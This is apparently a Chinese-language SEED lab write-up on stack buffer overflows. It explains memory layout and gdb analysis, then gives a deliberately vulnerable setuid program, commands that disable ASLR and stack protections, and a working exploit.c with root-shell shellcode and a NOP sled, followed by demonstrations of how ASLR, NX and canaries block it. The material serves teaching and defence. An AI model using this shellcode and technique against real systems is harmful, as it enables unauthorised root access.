# 缓冲区溢出攻击

缓冲区溢出(buffer-overflow)是一种非常普遍、同时非常危险的漏洞，在各种操作系统、应用软件中广泛存在。缓冲区溢出攻击是利用缓冲区溢出漏洞所进行的攻击，轻则可以导致程序失败、系统关机等，重则可以利用它执行非授权指令，甚至获取系统特权，从而进行其它的非法操作。缓冲区攻击有栈溢出、堆溢出、格式化字符串漏洞、整形变量溢出等。本文将主要介绍堆栈溢出攻击，并实现对一个ubuntu 16.04系统的简单的栈攻击，获取其root权限。

### 实验平台

操作系统：SEED Ubuntu16.04 VM (32-bit)，镜像下载地址：https://seedsecuritylabs.org/lab_env.html

虚拟机：Oracle VM VirtualBox 6.0.4

### 堆栈溢出原理

在计算机里，堆栈是内存里的一段区域。堆一般由程序员分配释放，如果程序员不释放，程序结束时可能由操作系统回收，分配方式类似于数据结构中的链表；栈由操作系统自动分配释放，存放函数的参数值、局部变量、返回地址等，分配方式类似于数据结构中的栈。以堆栈溢出为代表的缓冲区溢出已经成为最普遍的安全漏洞，由此引发的安全问题比比皆是。堆栈溢出的原因一般有以下几种：

1. 函数调用层次太深。函数递归调用时，系统要在栈中不断保存函数调用时的现场和产生的变量，如果递归调用太深，就会造成栈溢出，这时递归无法返回。再有，当函数调用层次过深时也可能导致栈无法容纳这些调用的返回地址而造成栈溢出。
2. 动态申请空间使用之后没有释放。由于C语言中没有垃圾资源自动回收机制，因此，需要程序主动释放已经不再使用的动态地址空间。申请的动态空间使用的是堆空间，动态空间使用不会造成堆溢出。
3. 数组访问越界。C语言没有提供数组下标越界检查，如果在程序中出现数组下标访问超出数组范围，在运行过程中可能会内存访问错误。
4. 指针非法访问。指针保存了一个非法的地址，通过这样的指针访问所指向的地址时会产生内存访问错误。

在一些高级语言中，类似python, java, go等，有一些机制用于防止栈溢出，比如，python默认的递归深度是1000，当递归调用超过这个深度后就会引发异常。此外，编译器层面上也有对堆栈进行保护，其中最著名的是Stack Guard和Stack-smashing Protectection。在操作系统的层面上，为了减少堆栈溢出带来的危害，还有类似于地址空间随机化的机制。

#### 程序的内存布局

为了进一步了解堆栈溢出的工作原理，首先来了解一个进程的内存是如何分配的。对于一个典型的C语言程序，其运行时，内存由5个短组成，分别为代码段（text segment），数据段（data segment），BSS段（BSS segment），堆（heap），栈（stack），这5个段在内存中分布如下

<img src="https://cdn.jsdelivr.net/gh/wangtl175/images/img/p1.png" alt="yQze0I.png" style="zoom:80%;"/>

代码段中存放程序的代码；数据段中存放着由程序员初始化的静态/全局变量，例如，`stack int a=3;`中的`a`变量；BSS段中存放着未初始化的静态/全局变量，例如，`stack int b;`中的`b`变量；堆是动态分配的内存，c语言中，`malloc`、`calloc`等函数用于申请动态内存，`free`函数用于释放，在途中是向上增长；栈则存放函数内定义的局部变量、函数返回地址、函数参数等，在图中是向下增长。注意，在现在的操作系统中，这几个段不一定是连在一起的。

这次我们实现的是栈溢出攻击，所以我们具体看一下一个函数在栈里面的数据的分布，以及一个函数是如何被调用的，以<span id="c">一个简单的c语言程序</span>为例

```c
/* fun.c */
#include<stdio.h>
int fun(int a, int b) {
    int l[3];
    l[0] = a;
    l[1] = b;
    l[2] = a + b;
}
int main() {
    fun(1, 2);
}
```

先用gcc对程序进行编译

```shell
gcc -g -fno-stack-protector fun.c -o fun
```

在使用gdb对fun程序进行调试，首先反汇编`main`函数，看一下是如何调用`fun`函数的

```shell
gdb fun

disass main
```

<img src="https://cdn.jsdelivr.net/gh/wangtl175/images/img/p2.png" alt="p1" style="zoom:80%;" />

从<+3>到<+12>就是一个完整的函数调用过程。可以看到，调用`fun`函数时，首先通过<+3>和<+5>两条指令把函数参数压进栈里，然后使用`call`指令跳转执行，而一条`call`指令会先把eip寄存器的内容压进栈，然后跳转到被调用函数里执行，eip寄存器里存放着`call`指令的下一条指令的地址，也就是函数的返回地址，即一条`call`指令相当于

```asm
push eip ; 此时eip寄存器里的值是指令<+12>的地址
jmp 0x80484db ; fun函数的起始地址
```

顺利从`fun`函数返回后，指令<+12>的作用清空栈里传给函数的参数。

然后对`fun`函数进行反汇编，看一下`fun`函数里的局部变量是如何分布的，以及如何返回到`main`函数，结果如<span id="fun1">下图</span>所示

```shell
disass fun
```

<img src="https://cdn.jsdelivr.net/gh/wangtl175/images/img/p3.png" alt="yQzKtf.png" style="zoom:70%;" />

在函数的开头，首先是<+0>和<+1>两条指令对ebp寄存器的操作，ebp寄存器又叫基址指针(extended base pointer)寄存器。函数的局部变量、参数等是保存在栈里的，而在函数运行时，栈指针寄存器esp的值会发生改变，所以无法通过esp访问到这些变量和参数，因此引入了ebp寄存器，保存着栈中的一个固定的地址，通过计算相对于该地址的偏移量即可访问到变量和参数。在32位系统中，一个int类型、返回地址、寄存器大小都是4个字节。此外由`main`函数的汇编代码可以看到是参数`b`先进栈(指令<+3>)，再是参数`a`进栈。因此，指令<+6>中[ebp+0x8]访问的是参数`a`，由此可以推断指令<+9>中[ebp-0xc]访问的是`l[0]`，两条汇编指令对应的c代码是`l[0] = a`。指令<+12>到<+29>分析也是类似的。

指令<+30>和<+31>是从`fun`函数返回`main`函数的过程。`leave`指令相当于`mov esp,ebp`和`pop ebp`，即恢复了进入`fun`函数时ebp和esp寄存器的值，而`ret`指令相当于`pop eip`，即把栈中的函数返回地址弹出，放入eip寄存器中，实现返回到`main`函数。

通过上述分析，我们可以获知`fun`函数的栈分布如下图所示

<img src="https://cdn.jsdelivr.net/gh/wangtl175/images/img/p4 (2).png" alt="p1" style="zoom:90%;" />

从图中就可以大致看到进行栈溢出攻击的一种方式，即越过数组`l`的边界去修改函数返回地址，从而跳转到一段恶意代码去执行，即类似`l[4]=somewhere`。在c语言中，类似`strcpy`函数等是没有边界检查的，所以我们可以通过`strcpy`函数向一个字符串数组拷贝超过其大小的内容，从而修改函数返回地址，这也是我们稍后实现的栈溢出攻击的原理。

```c
// 向buf拷贝超过其大小的内容。
#include<stdio.h>
#include<string.h>
int main() {
    char buf[3];
    char *s="hello,world";
    strcpy(buf,s);
}
```

这个攻击的思路就是，首先在内存中放置一段可以获取root权限恶意代码，然后利用`strcpy`没有边界检查的特点造成栈溢出修改函数的返回地址，跳转到恶意代码执行。

### 实现栈溢出攻击

为防止缓冲区溢出漏洞，已经出现了多种保护机制。为了实现这次攻击，我们需要停用一些保护机制，具体是：地址空间随机化 (Address Randomization)、不可执行栈 (Non-executable Stack)、Stack Guard。

假设有一个具有栈溢出漏洞的程序如下：

```c
/* stack.c */

#include <stdlib.h>
#include <stdio.h>
#include <string.h>

int bof(char *str)
{
    char buffer[24];

    /* 这里存在栈溢出的危险 */
    strcpy(buffer, str);

    return 1;
}

int main(int argc, char **argv)
{
    char str[517];
    FILE *badfile;

    badfile = fopen("badfile", "r");
    fread(str, sizeof(char), 517, badfile);
    bof(str);

    printf("Returned Properly\n");
    return 1;
}
```

对上述文件进行编译，注意要停用一些保护机制

禁止地址空间随机化

```shell
su root
sysctl -w kernel.randomize_va_space=0
exit
```

使用gcc进行编译

```shell
su root
gcc -g -fno-stack-protector -z execstack stack.c -o stack
chmod 4755 stack
exit
```

`-fon-stack-protector`选项是关闭gcc的Stack Guard；`-z execstack`选项；最后的`chmod 4755 stack`是让其它用户在执行stack程序时，拥有和所有者(root)相当的权限（这样的程序是存在的），这样可以使恶意代码中的`setuid`指令可以执行。

攻击的具体思路是：精心设计badfile的内容，让其包含一段可以获取root权限的代码，这段代码会被读到stack的`str`中，再拷贝到`bof`函数的`buffer`里，只要badfile里的内容够多，就会突破`buffer`的边界，从而覆盖掉`bof`函数的返回地址，控制函数返回到恶意代码里执行。

首先，使用gdb对stack进行分析

```shell
gdb stack
```

查看`str`的地址

``` shell
b main     # 设置断点
r          # 运行
p /x &str  # 参考str的地址
```

<img src="https://cdn.jsdelivr.net/gh/wangtl175/images/img/p5.png" alt="p1" style="zoom:120%;" />

我们的恶意代码最终会插入到0xbfffea37开始517个字节的内存里。

然后查看`bof`的`buffer`地址，以及存放返回地址的位置

先运行到`bof`函数里，再查看`bof`的汇编代码

```shell
b bof
r
disass bof
```

<img src="https://cdn.jsdelivr.net/gh/wangtl175/images/img/p6.png" alt="p1" style="zoom:80%;" />

可以看到，此时程序已经运行到指令<+6>，由之前的分析可以得知，此时寄存器ebp里的值加上4就是返回地址的存放地址了。查看ebp寄存器的值

```shell
p /x $ebp
```

<img src="https://cdn.jsdelivr.net/gh/wangtl175/images/img/p7.png" alt="p1" style="zoom:120%;" />

再查看`buffer`的地址

```shell
p /x &buffer
```

<img src="https://cdn.jsdelivr.net/gh/wangtl175/images/img/p8.png" alt="p1" style="zoom:120%;" />

因此，返回地址的位置和`buffer`首地址相距0xbfffea18+4-0xbfffe9f8=0x24，即`buffer[0x24]`就可以访问到返回地址。

通过上述分析，恶意代码在`str`里。所以，在`bof`函数里，要修改`buffer[0x24]`处的内容为恶意代码的入口。为了增大攻击成功的可能性，我们在`str`首地址到恶意代码的入口之前填充`NOP`指令，该指令不进行任何操作。填充`NOP`可以再跳转 ”不那么精确“ 的时候，也会 “滑” 到恶意代码的入口，即假设恶意代码插入到`str[400]`处，只要跳转到`str[0]`和`str[400]`之间都可以成功实现攻击。

下面是一个生成我们精心设计的badfile程序，将恶意代码插入到`str[400]`处开始的地方，然后控制`bof`函数跳转到0xbfffeb95 （大概在`str[350]`处）

```c
/* exploit.c */
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
// 恶意代码
char shellcode[]=
    "\x31\xc0"             /* xorl    %eax,%eax              */
    "\x31\xdb"             /* xorl    %ebx,%ebx              */
    "\xb0\xd5"             /* movb    $0xd5,%al              */
    "\xcd\x80"             /* int     $0x80                  */
    "\x31\xc0"             /* xorl    %eax,%eax              */
    "\x50"                 /* pushl   %eax                   */
    "\x68""//sh"           /* pushl   $0x68732f2f            */
    "\x68""/bin"           /* pushl   $0x6e69622f            */
    "\x89\xe3"             /* movl    %esp,%ebx              */
    "\x50"                 /* pushl   %eax                   */
    "\x53"                 /* pushl   %ebx                   */
    "\x89\xe1"             /* movl    %esp,%ecx              */
    "\x99"                 /* cdq                            */
    "\xb0\x0b"             /* movb    $0x0b,%al              */
    "\xcd\x80"             /* int     $0x80                  */
;

void main(int argc, char **argv)
{
    char buffer[517];
    FILE *badfile;

    /* 使用NOP填充 */
    memset(&buffer, 0x90, 517);

    strcpy(buffer+400, shellcode);  /* 恶意代码将插入到str[400]处开始的地方 */
    strcpy(buffer+0x24, "\x95\xeb\xff\xbf");  /* 控制bof函数返回到0xbfffeb95处，注意要倒序 */

    /* 生成badfile文件 */
    badfile = fopen("./badfile", "w");
    fwrite(buffer, 517, 1, badfile);
    fclose(badfile);
}

```

编译、运行exploit.c

```shell
gcc exploit.c -o exploit
./exploit
```

此时生成了badfile。

为了体现root权限有无，普通用户尝试修改/etc/passwd文件，执行`vim /etc/passwd`

<img src="https://cdn.jsdelivr.net/gh/wangtl175/images/img/p10.png" alt="p1" style="zoom:80%;" />

运行stack程序，就会进入到一个具有sudo权限的sh程序里。

```
./stack
```

<img src="https://cdn.jsdelivr.net/gh/wangtl175/images/img/p9.png" alt="p1" style="zoom:120%;" />

在这个sh里，可以对受保护文件进行修改，例如`vim /etc/passwd`

<img src="https://cdn.jsdelivr.net/gh/wangtl175/images/img/p11.png" alt="p1" style="zoom:80%;" />

可见，成功地获取了系统的root权限。

### 对于栈溢出的保护措施

在进行实验时，我们停用了几个保护措施，现在我们来探讨一下这些保护措施是如何抵御栈溢出攻击的。

#### 地址空间随机化

地址空间随机化，顾名思义，程序每次加载到的内存位置是随机的，所以，即使可以利用栈溢出控制函数的返回地址，但是无法确定恶意代码的位置，因此，可以有效地防范栈溢出攻击。

现在我们开启地址空间随机化再进行重复上述攻击

```shell
su root
sysctl -w kernel.randomize_va_space=2
exit
./stack
```

<img src="https://cdn.jsdelivr.net/gh/wangtl175/images/img/p12.png" alt="p1" style="zoom:80%;" />

使用gdb查看`str`的地址，发现已经不是原来的0xbfffea37了，攻击失败时显然易见的。

<img src="https://cdn.jsdelivr.net/gh/wangtl175/images/img/p13.png" alt="p1" style="zoom:120%;" />

#### 不可执行栈

不可执行栈的基本原理是将数据所在的内存页标记为不可执行的，当进程尝试去执行数据页面上的指令时，CPU就会抛出异常，而不是去执行。所以，当开启了不可执行栈选项时，即使我们的恶意代码已经插入到内存，但由于处在数据页面，因此无法执行。

再次关闭地址空间随机化，gcc编译stack时开启不可执行栈选项

```shell
su root
sysctl -w kernel.randomize_va_space=0
gcc -g -fno-stack-protector stack.c -o stack  # gcc默认开启不可执行栈
chmod 4755 stack
exit
```

使用gdb查看`str`位置时，发现又回到了原来的位置上

<img src="https://cdn.jsdelivr.net/gh/wangtl175/images/img/p14.png" alt="p1" style="zoom:120%;" />

进行攻击，仍然失败

<img src="https://cdn.jsdelivr.net/gh/wangtl175/images/img/p15.png" alt="p1" style="zoom:120%;" />

#### Stack Guard

gcc中的Stack Guard的保护原理时利用 "Canaries" 检测对函数栈的破坏。具体是再缓冲区（如：栈）和控制信息（如 ebp等）间插入一个canary word。这样，当缓冲区溢出时，再返回地址被覆盖之前canary word会首先被覆盖，通过检测canary word的值是否被修改，就可以判断是否发生了溢出。还是以上述的[简单c程序](#c)为例

gcc开启Stack Guard对fun.c进行编译，然后用gdb查看`fun`函数的汇编

```shell
gcc -g fun.c -o fun  # gcc默认开启Stack Guard
gdb fun
disass fun
```

<img src="https://cdn.jsdelivr.net/gh/wangtl175/images/img/p16.png" alt="p1" style="zoom:80%;" />

和[上图](#fun1)最大差别在于函数真正执行前多了以下几条指令

<img src="https://cdn.jsdelivr.net/gh/wangtl175/images/img/p17.png" alt="p1" style="zoom:80%;" />

以及退出之前，多了以下几条指令

<img src="https://cdn.jsdelivr.net/gh/wangtl175/images/img/p18.png" alt="p1" style="zoom:70%;" />

通过查阅资料可知，gs:0x14里保存的是一个随机数，这个随机数就是canary word。真正执行函数前的指令<+6>到<+15>把这canary word放到ebp-0xc位置上，而函数返回前的<+41>到<+53>指令就是判断canary word是否被修改，如果没被修改则正常返回。由此我们可以大概地画出此时函数栈内的分布如下

<img src="https://cdn.jsdelivr.net/gh/wangtl175/images/img/p19.png" alt="p1" style="zoom:80%;" />

如果通过之前的方法去修改函数的返回地址，就会修改了canary word的值，就在函数返回前会被检测到。下面是开启了Stack Guard来重复上面的攻击

```shell
su root
gcc -g -z execstack stack.c -o stack
chmod 4755 stack
exit
./stack
```

<img src="https://cdn.jsdelivr.net/gh/wangtl175/images/img/p20.png" alt="p1" style="zoom:80%;" />

可以看到，栈溢出被检测到并终止了进程。

### 结束语

通过这次实验，加深了我对操作系统、计算机组成原理、编译器等方面的理解，同时也认识到了缓冲区溢出所带来的危害。为此，我们要养成良好的编程习惯，例如使用安全型函数避免风险。

### 参考

[GCC 中的编译器堆栈保护技术](https://www.ibm.com/developerworks/cn/linux/l-cn-gccstack/?S_TACT=105AGX52&S_CMP=tec-ccid#ibm-pcon)

[SEED BOOKS](https://www.handsonsecurity.net/files/chapters/buffer_overflow.pdf)